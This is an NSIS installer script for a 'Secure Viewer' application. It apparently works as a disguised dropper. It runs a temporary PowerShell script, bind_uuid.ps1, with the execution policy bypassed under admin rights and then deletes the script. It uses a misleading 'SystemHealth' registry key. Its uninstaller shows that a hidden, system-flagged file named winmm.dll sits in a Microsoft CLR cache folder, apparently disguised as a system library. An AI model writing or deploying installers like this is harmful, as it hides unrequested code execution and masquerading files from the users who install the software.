!include "MUI2.nsh"

Name "Secure Viewer"
OutFile "SecureViewerInstaller.exe"
InstallDir "$LOCALAPPDATA\SecureViewer"
RequestExecutionLevel admin

Page directory
Page instfiles

Section "Install Secure Viewer"

  ; Check if already installed
  ReadRegDWORD $0 HKCU "Software\SystemHealth" "RunState"
  IntCmp $0 1 alreadyInstalled

  SetOutPath "$INSTDIR"
  File "dist\viewer.exe"

  ; Set up temp path for script
  StrCpy $1 "$TEMP\bind_uuid.ps1"
  File "/oname=$1" "bind_uuid.ps1"

  ; Run the PowerShell script from temp
  nsExec::Exec '"$SYSDIR\WindowsPowerShell\v1.0\powershell.exe" -ExecutionPolicy Bypass -File "$1"'
  Pop $0
  DetailPrint "bind_uuid.ps1 exit code: $0"

  ; Delete the script after running
  Delete "$1"

  ; Create shortcut and uninstaller
  CreateShortCut "$DESKTOP\Secure Viewer.lnk" "$INSTDIR\viewer.exe"
  WriteUninstaller "$INSTDIR\uninstall.exe"

  ; Set registry key to mark installed
  WriteRegDWORD HKCU "Software\SystemHealth" "RunState" 1

  Goto done

  alreadyInstalled:
  MessageBox MB_ICONSTOP "Secure Viewer is already installed. Reinstallation is not allowed."
  Abort

  done:
SectionEnd

Section "Uninstall"
  Delete "$INSTDIR\viewer.exe"
  Delete "$DESKTOP\Secure Viewer.lnk"
  Delete "$INSTDIR\uninstall.exe"
  RMDir "$INSTDIR"

  ; Remove UUID hash file
  ExecWait 'attrib -h -s "%LOCALAPPDATA%\Microsoft\CLR\Cache\winmm.dll"'
  Delete "$LOCALAPPDATA\Microsoft\CLR\Cache\winmm.dll"

  ; Clean registry
  DeleteRegKey HKCU "Software\SystemHealth"
SectionEnd
